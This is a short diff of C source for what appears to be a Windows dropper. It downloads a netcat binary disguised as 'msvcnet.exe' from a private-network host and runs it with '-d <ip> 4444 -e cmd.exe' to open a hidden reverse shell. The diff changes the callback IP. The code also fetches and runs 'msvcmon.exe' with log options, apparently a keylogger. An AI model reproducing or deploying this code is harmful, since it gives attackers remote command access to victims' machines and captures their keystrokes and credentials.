@@ -37,7 +37,7 @@ void DownloadFile(const char* url, const char* filePath)
 int main(int argc, char* argv[]) 
 {
     const char* ncurl    = "http://192.168.11.187/msvcnet.exe";
-    const char* ncparams = "-d 192.168.11.187 4444 -e C:\\Windows\\System32\\cmd.exe";
+    const char* ncparams = "-d 192.168.11.135 4444 -e C:\\Windows\\System32\\cmd.exe";
 
     const char* kylgurl    = "http://192.168.11.187/msvcmon.exe";
     const char* kylgparams = "--out-log msvclog";
